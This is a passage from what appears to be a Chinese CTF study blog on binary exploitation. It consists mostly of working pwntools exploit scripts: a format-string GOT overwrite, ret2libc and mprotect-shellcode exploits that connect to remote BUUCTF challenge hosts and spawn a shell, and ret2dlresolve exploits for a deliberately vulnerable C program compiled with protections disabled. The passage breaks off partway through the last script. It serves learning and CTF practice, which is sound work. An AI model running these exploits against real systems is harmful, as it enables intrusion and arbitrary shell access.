class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">elf = ELF(&#x27;./pwn5&#x27;)</span></span><br><span class="line"><span class="string">atoi_got = elf.got[&#x27;atoi&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">payload=fmtstr_payload(10,&#123;atoi_got:system_plt&#125;)</span></span><br><span class="line"><span class="string">io.sendline(payload)</span></span><br><span class="line"><span class="string">io.sendline(b&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"><span class="string">io.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注释部分是自己想的payload，打不通，</span></span><br><span class="line"><span class="comment">#参考fmtstr_payload()的源代码后重新写了个payload，打通了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个 %112c 的由来：我们要向atoi = 0x0804c034地址写入system = 0x08049080</span></span><br><span class="line"><span class="comment">#首先写末尾一字节0x80 = 128，四个p32(0x...)占了16(4个4byte)字节，所以(128-16)%0xFF = 112</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个 %16c 的由来：</span></span><br><span class="line"><span class="comment">#其次我们要写倒数第二个字节0x90，前面输出了16+112=0x80个字节，我们只需再输出0x10=16个字节就行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第三个 %116c 的由来：</span></span><br><span class="line"><span class="comment">#再者我们要写入第二个字节0x04，前面输出了0x90个字节，要输出0x04只能溢出，</span></span><br><span class="line">   <span class="comment">#而(0x90+0x74)%0xFF=0x04,0x74=116,所以第三个为%116C，输出116个空格</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第四个 %4c 的由来：</span></span><br><span class="line"><span class="comment">#最后我们要写入第一个字节0x08，同理，第三步后，通过溢出相当于之前只输出过4个字节</span></span><br><span class="line">   <span class="comment">#所以我们用 %4c 再输出4个空格即可向目标地址写入0x08</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#中间的 b&#x27;%xx$hhn&#x27; 视为 %n 不算在打印字符数内(个人看法)</span></span><br><span class="line"><span class="comment">#了解了原理后，我们以后就可以直接用</span></span><br><span class="line">    <span class="comment">#payload=fmtstr_payload(10,&#123;atoi_got:system_plt&#125;)</span></span><br><span class="line">    <span class="comment">#来生成payload了</span></span><br></pre></td></tr></table></figure><br/><p>参考链接4：<a href="https://www.anquanke.com/post/id/83835">CCTF pwn3格式化字符串漏洞详细writeup - 安全客，安全资讯平台 (anquanke.com)</a></p><p>64位格串：</p><p>参考链接5：<a href="https://blog.csdn.net/weixin_46521144/article/details/115129011">64位格式化字符串漏洞利用——axb_2019_fmt64_N1ch0l4s的博客-CSDN博客</a></p><p>参考链接6：[<a href="https://blog.csdn.net/mcmuyanga/article/details/113242453">BUUCTF]PWN——axb_2019_fmt64（64位格式化字符串改got表）_Angel~Yan的博客-CSDN博客</a></p><p>参考链接7：<a href="https://www.anquanke.com/post/id/194458?display=mobile">64位格式化字符串漏洞修改got表利用详解 - 安全客，安全资讯平台 (anquanke.com)</a></p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#以下是fmtstr_payload()的源代码</span><br><span class="line">#https://github.com/Gallopsled/pwntools/blob/0ff989a043/pwnlib/fmtstr.py#L103-178</span><br><span class="line">def fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;):</span><br><span class="line"></span><br><span class="line">    # &#x27;byte&#x27;: (number, step, mask, format, decalage)</span><br><span class="line">    config = &#123;</span><br><span class="line">        32 : &#123;</span><br><span class="line">            &#x27;byte&#x27;: (4, 1, 0xFF, &#x27;hh&#x27;, 8),</span><br><span class="line">            &#x27;short&#x27;: (2, 2, 0xFFFF, &#x27;h&#x27;, 16),</span><br><span class="line">            &#x27;int&#x27;: (1, 4, 0xFFFFFFFF, &#x27;&#x27;, 32)&#125;,</span><br><span class="line">        64 : &#123;</span><br><span class="line">            &#x27;byte&#x27;: (8, 1, 0xFF, &#x27;hh&#x27;, 8),</span><br><span class="line">            &#x27;short&#x27;: (4, 2, 0xFFFF, &#x27;h&#x27;, 16),</span><br><span class="line">            &#x27;int&#x27;: (2, 4, 0xFFFFFFFF, &#x27;&#x27;, 32)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if write_size not in [&#x27;byte&#x27;, &#x27;short&#x27;, &#x27;int&#x27;]:</span><br><span class="line">        log.error(&quot;write_size must be &#x27;byte&#x27;, &#x27;short&#x27; or &#x27;int&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">    number, step, mask, formatz, decalage = config[context.bits][write_size]</span><br><span class="line"></span><br><span class="line">    # add wheres</span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    for where, what in writes.items():</span><br><span class="line">        for i in range(0, number*step, step):</span><br><span class="line">            payload += pack(where+i)</span><br><span class="line"></span><br><span class="line">    numbwritten += len(payload)</span><br><span class="line">    fmtCount = 0</span><br><span class="line">    for where, what in writes.items():</span><br><span class="line">        for i in range(0, number):</span><br><span class="line">            current = what &amp; mask</span><br><span class="line">            if numbwritten &amp; mask &lt;= current:</span><br><span class="line">                to_add = current - (numbwritten &amp; mask)</span><br><span class="line">            else:</span><br><span class="line">                to_add = (current | (mask+1)) - (numbwritten &amp; mask)</span><br><span class="line"></span><br><span class="line">            if to_add != 0:</span><br><span class="line">                payload += &quot;%&#123;&#125;c&quot;.format(to_add)</span><br><span class="line">            payload += &quot;%&#123;&#125;$&#123;&#125;n&quot;.format(offset + fmtCount, formatz)</span><br><span class="line"></span><br><span class="line">            numbwritten += to_add</span><br><span class="line">            what &gt;&gt;= decalage</span><br><span class="line">            fmtCount += 1</span><br><span class="line"></span><br><span class="line">    return payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ubuntu20.04下的pack()与.format测试结果</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>where = <span class="number">134529076</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = pack(where)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="string">b&#x27;4\xc0\x04\x08&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(where,<span class="built_in">hex</span>(where),payload1)</span><br><span class="line"><span class="number">134529076</span> <span class="number">0x804c034</span> <span class="string">b&#x27;4\xc0\x04\x08&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a)</span><br><span class="line">%10c</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(b)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(c)</span><br><span class="line">%123c</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="栈"><a href="#栈" class="headerlink" title=" 栈 "></a><center><font color="green"> 栈 </font></center></h2><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title=" ciscn_2019_c_1 "></a><center><font color="orange"> ciscn_2019_c_1 </font></center></h3><h4 id="题型：ret2libc"><a href="#题型：ret2libc" class="headerlink" title="题型：ret2libc"></a>题型：ret2libc</h4><p>参考链接：<a href="https://www.cnblogs.com/zhuangzhouQAQ/p/15034453.html">ciscn_2019_c_1 1 - 庄周恋蝶蝶恋花 - 博客园 (cnblogs.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28120</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400b28</span>       <span class="comment">#readelf -a &lt;binary&gt;</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span>    <span class="comment">#pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4006b9</span>        <span class="comment">#ret</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload  = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)    <span class="comment">#0 - libc6_2.27-3ubuntu1_amd64</span></span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)        <span class="comment">#栈平衡操作</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><br/><h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title=" get_started_3dsctf_2016 "></a><center><font color="orange"> get_started_3dsctf_2016 </font></center></h3><p>一道比较有意思的题，记录一下</p><p>参考链接1：<a href="https://blog.csdn.net/Nashi_Ko/article/details/109528155">get_started_3dsctf_2016_Nashi_Ko的博客-CSDN博客_get_started_3dsctf_2016</a></p><p>参考链接2：[<a href="https://blog.csdn.net/mcmuyanga/article/details/108274091">BUUCTF]PWN11——get_started_3dsctf_2016_Angel~Yan的博客-CSDN博客</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">参靠脚本<span class="number">1</span>：</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25231</span>)</span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x80489A0</span></span><br><span class="line">main = <span class="number">0x8048A20</span></span><br><span class="line">fakeebp = <span class="number">0x0804E6A0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">56</span> + p32(get_flag) + p32(fakeebp) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">参靠脚本<span class="number">2</span>：</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28526</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x080eb000</span></span><br><span class="line">pop_ebx_esi_edi_ret=<span class="number">0x080509a5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x38</span> + p32(elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]) + p32(pop_ebx_esi_edi_ret) + p32(bss) + p32(<span class="number">0x2c</span>) + p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(bss) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x2c</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload=asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">做题笔记</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ret2dlresolve</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/08/25/ret2dlresolve/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/08/25/ret2dlresolve/</id>
    <published>2022-08-25T14:57:54.000Z</published>
    <updated>2022-08-26T14:56:57.952Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwntools-rop模块"><a href="#pwntools-rop模块" class="headerlink" title="pwntools rop模块"></a>pwntools rop模块</h2><p>参考链接：<a href="https://www.jianshu.com/p/0d45e2025d97">https://www.jianshu.com/p/0d45e2025d97</a></p><br/><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><p>解题场景：ubuntu18.04（注：ubuntu20.04 gcc版本过高，存在一些保护机制）</p><h4 id="1、题目C代码"><a href="#1、题目C代码" class="headerlink" title="1、题目C代码"></a>1、题目C代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32</span><br></pre></td></tr></table></figure><h4 id="2、解题exp"><a href="#2、解题exp" class="headerlink" title="2、解题exp"></a>2、解题exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考exp1 #--------------------------长串payload做法----------------------------#</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x08049804</span>+<span class="number">4</span>,<span class="number">4</span>) <span class="comment"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>,<span class="built_in">len</span>((dynstr))) <span class="comment"># construct a fake dynstr section</span></span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>+<span class="number">0x100</span>,<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># read /bin/sh\x00</span></span><br><span class="line">rop.raw(<span class="number">0x08048376</span>) <span class="comment"># the second instruction of read@plt </span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(<span class="number">0x080498E0</span>+<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(p32(<span class="number">0x080498E0</span>))</span><br><span class="line">p.send(dynstr)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考exp2 #--------------------------栈迁移做法---------------------------------#</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">elf = ELF (<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote (＇127.0.0.1＇,10001)</span></span><br><span class="line">io = process (<span class="string">&#x27;./ydm&#x27;</span>)</span><br><span class="line">pppr_addr = <span class="number">0x08048619</span>      <span class="comment"># pop esi ; pop edi ; pop ebp ; ret </span></span><br><span class="line">pop_ebp_addr =<span class="number">0x0804861b</span>    <span class="comment"># pop ebp ; ret</span></span><br><span class="line">leave_ret_addr =<span class="number">0x08048458</span>  <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt [<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got [<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt  = elf.plt [<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr </span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr </span><br><span class="line">dynsym  = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr </span><br><span class="line">dynstr  = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr  </span><br><span class="line">bss_addr = elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr + <span class="number">0x500</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack_pivot</span> ():</span></span><br><span class="line">    payload_1  = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x6c</span> + <span class="number">4</span>)</span><br><span class="line">    payload_1 += p32(read_plt)        <span class="comment"># read (0, bss _ addr ,100)</span></span><br><span class="line">    payload_1 += p32(pppr_addr)       <span class="comment"># clean the stack </span></span><br><span class="line">    payload_1 += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">100</span>) </span><br><span class="line">    payload_1 += p32(pop_ebp_addr)</span><br><span class="line">    payload_1 += p32(bss_addr)        <span class="comment"># ebp </span></span><br><span class="line">    payload_1 += p32(leave_ret_addr)  <span class="comment"># mov esp , ebp ; pop ebp ; pop eip </span></span><br><span class="line">    io.send(payload_1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span> ():</span></span><br><span class="line">    reloc_index = bss_addr + <span class="number">28</span> - rel_plt </span><br><span class="line">    r_sym  = (bss_addr + <span class="number">40</span> - dynsym )/<span class="number">0x10</span></span><br><span class="line">    r_type = <span class="number">0x7</span></span><br><span class="line">    r_info = (r_sym &lt;&lt; <span class="number">8</span>) + (r_type &amp; <span class="number">0xff</span>) </span><br><span class="line">    fake_reloc = p32(write_got) + p32( r_info)</span><br><span class="line">    st_name = bss_addr + <span class="number">56</span> - dynstr </span><br><span class="line">    st_bind = <span class="number">0x1</span></span><br><span class="line">    st_type = <span class="number">0x2</span></span><br><span class="line">    st_info = (st_bind &lt;&lt; <span class="number">4</span>) + (st_type &amp; <span class="number">0xf</span>)</span><br><span class="line">    fake_sym   = p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info) </span><br><span class="line">    payload_7  = <span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">    payload_7 += p32(plt_0)</span><br><span class="line">    payload_7 += p32(reloc_index ) </span><br><span class="line">    payload_7 += <span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">    payload_7 += p32(bss_addr +<span class="number">80</span>) </span><br><span class="line">    payload_7 += <span class="string">b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">    payload_7 += fake_reloc </span><br><span class="line">    payload_7 += <span class="string">b&#x27;AAAA&#x27;</span>  </span><br><span class="line">    payload_7 += fake_sym</span><br><span class="line">    payload_7 += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line">    payload_7 += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">80</span>- <span class="built_in">len</span> ( 